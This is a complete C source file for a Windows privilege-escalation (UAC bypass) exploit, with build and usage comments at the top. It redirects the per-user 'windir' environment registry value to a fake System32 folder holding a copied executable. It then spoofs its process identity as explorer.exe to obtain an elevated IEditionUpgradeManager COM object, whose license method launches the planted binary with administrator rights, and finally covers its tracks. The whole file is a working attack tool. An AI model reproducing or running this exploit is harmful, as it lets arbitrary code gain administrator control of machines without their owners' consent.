// x86_64-w64-mingw32-gcc EditionUpgradeManager.c -s -w -lole32 -lntdll -o /share/EditionUpgradeManager.exe
// Usage: .\EditionUpgradeManager.exe [EXE ON DISK TO EXECUTE]
#include <windows.h>
#include <stdio.h>
#include "ntos.h"

typedef interface IEditionUpgradeManager IEditionUpgradeManager;

typedef struct IEditionUpgradeManagerVtbl {

    BEGIN_INTERFACE

    HRESULT(STDMETHODCALLTYPE *QueryInterface)(
        __RPC__in IEditionUpgradeManager * This,
        __RPC__in REFIID riid,
        _COM_Outptr_  void **ppvObject);

    ULONG(STDMETHODCALLTYPE *AddRef)(
        __RPC__in IEditionUpgradeManager * This);

    ULONG(STDMETHODCALLTYPE *Release)(
        __RPC__in IEditionUpgradeManager * This);

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *InitializeWindow)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *UpdateOperatingSystem)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *ShowProductKeyUI)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *UpdateOperatingSystemWithParams)(
        __RPC__in IEditionUpgradeManager * This
        );

    //incomplete definition
    HRESULT(STDMETHODCALLTYPE *AcquireModernLicenseForWindows)(
        __RPC__in IEditionUpgradeManager * This
        );

    HRESULT(STDMETHODCALLTYPE *AcquireModernLicenseWithPreviousId)(
        __RPC__in IEditionUpgradeManager * This,
        __RPC__in LPWSTR PreviousId,
        __RPC__in DWORD *Data
        );

    //incomplete, irrelevant
    END_INTERFACE

} *PIEditionUpgradeManagerVtbl;

interface IEditionUpgradeManager
{
    CONST_VTBL struct IEditionUpgradeManagerVtbl *lpVtbl;
};

// globals for callback and module
PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

/* enumerate modules callback handler */
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

int main(int argc, char *argv[]) {

    // check for arg
    if (argc < 2) {
        printf("No EXE supplied! Re-run the file and supply a EXE on disk as the first argument!\n");
        return 1;
    }

    // Get current username and set the tempPath to the current user's Downloads directory
    // If the current username is not found or the path is invalid, use 'C:\Users\Public\Downloads\' instead
    char tempPath[MAX_PATH] = "C:\\Users\\";
    char username[257];
    DWORD username_len = 257;
    BOOL success = GetUserName(username, &username_len);
    //BOOL success = 0; // test GetUserName failure
    if (success) {
        strcat(tempPath, username);
        strcat(tempPath, "\\Downloads");
        DWORD attributes = GetFileAttributes(tempPath);
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            printf("Path based on current username is invalid: %d\n", GetLastError());
            strcpy(tempPath, "C:\\Users\\Public\\Downloads");
            printf("Using the following path instead: %s\n", tempPath);
        }
    } else {
        printf("Failed to get current username: %d\n", GetLastError());
        strcat(tempPath, "Public\\Downloads");
        printf("Using the following path instead: %s\n", tempPath);
    }
    printf("Writing temporary files to: %s\n", tempPath);

    // define and format required strings
    char tempSystem32[100] = {0};
    char targetBinLocation[100] = {0};
    strcat(tempSystem32, tempPath);
    strcat(tempSystem32, "\\System32");
    strcat(targetBinLocation, tempSystem32);
    strcat(targetBinLocation, "\\Clipup.exe");

    // Create temp System32 directory
    BOOL test = CreateDirectoryA(tempSystem32, NULL);
    if (test == 0 && GetLastError() != 183) {
        printf("Error creating new System32 directory\n");
        return 1;
    } else {
        printf("Successfully created new System32 directory\n");
    }

    // Copy supplied EXE to target location
    int result = CopyFile(argv[1], targetBinLocation, FALSE);
    if (result != 0) {
        printf("Successfully copied target binary to temp System32 directory\n");
    } else {
        printf("Failed to copy target binary to temp System32 directory! Exiting.\n");
        return 1;
    }

    // Create windir reg key and/or open handle to it
    HKEY windirKey;
    if(RegCreateKey(HKEY_CURRENT_USER, "Environment", &windirKey)!=ERROR_SUCCESS) return 1;

    // set windir reg key to writable dir
    LSTATUS regStatus = RegSetValueEx(windirKey, "windir", 0, REG_SZ, tempPath, strlen(tempPath));
    if (regStatus != 0) {
        printf("Error setting windir registry key!: %d\n", regStatus);
        return 1;
    } else {
        printf("Successfully modified HKCU:Environment\\windir registry key!\n");
    }

    //spoof explorer.exe PEB for elevated COM access
    NTSTATUS Status;
    WCHAR szMoniker[MAX_PATH];
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    LPWSTR pCMDpath;
    size_t sSize;
    RtlAcquirePebLock();
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        wcscpy(ImageFileName, L"c:\\Windows\\");
        wcscat(ImageFileName, L"explorer.exe");
    }
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        wcscpy(CommandLine, L"explorer.exe");
    }
    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    RtlReleasePebLock();

    // create IEditionUpgradeManager elevated COM object
    IID IID_IEditionUpgradeManager;
    HRESULT hr;
    IEditionUpgradeManager *Manager = NULL;
    BIND_OPTS3 bop;
    WCHAR szBuffer[MAX_PATH + 1];
    DWORD Data[4];
    if (SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
        
        if (IIDFromString(L"{F2DCB80D-0670-44BC-9002-CD18688730AF}", &IID_IEditionUpgradeManager) == S_OK) {
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

            wcscpy(szBuffer, L"Elevation:Administrator!new:{17CCA47D-DAE5-4E4A-AC42-CC54E28F334A}");

            RtlSecureZeroMemory(&bop, sizeof(bop));
            bop.cbStruct = sizeof(bop);
            bop.dwClassContext = CLSCTX_LOCAL_SERVER;

            hr = CoGetObject(szBuffer, (BIND_OPTS *)&bop, &IID_IEditionUpgradeManager, &Manager);

            if (SUCCEEDED(hr)) {
                Data[0] = 2;
                Data[1] = 0;
                Data[2] = 2;
                Data[3] = 0;

                // call AcquireModernLicenseWithPreviousId method from elevated COM object, which will execute Clipup.exe from the created directory
                printf("Calling AcquireModernLicenseWithPreviousId method from elevated COM object...\n");
                Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager, L"pe386", (DWORD*)&Data);
                Manager->lpVtbl->Release(Manager);
            }
        }
    }

    // reset windir key to it's default value
    char ogWinDir[MAX_PATH] = "C:\\Windows";
    regStatus = RegSetValueEx(windirKey, "windir", 0, REG_SZ, ogWinDir, strlen(ogWinDir));
    if (regStatus != 0) {
        printf("Error setting windir registry key!: %d\n", regStatus);
    } else {
        printf("Successfully reset the HKCU:Environment\\windir registry key to it's original value!\n");
    }

    // close handle to reg key
    RegCloseKey(windirKey);
    
    // Sleep for 2 seconds to allow for elevated process to finish terminating
    Sleep(2000);

    // delete exe from created directory
    result = DeleteFile(targetBinLocation);
    if (result != 0) {
        printf("File deleted succesfully: %s\n", targetBinLocation);
    }
    else {
        printf("Failed to delete '%s' in the fake windows folder: %d\n", targetBinLocation, GetLastError());
    }

    // delete created directory
    result = RemoveDirectory(tempSystem32);
    if (result != 0) {
        printf("Folder deleted succesfully: %s\n", tempSystem32);
    }
    else {
        printf("Failed to delete folder %s: %d\n", tempSystem32, GetLastError());
    }

    return;

}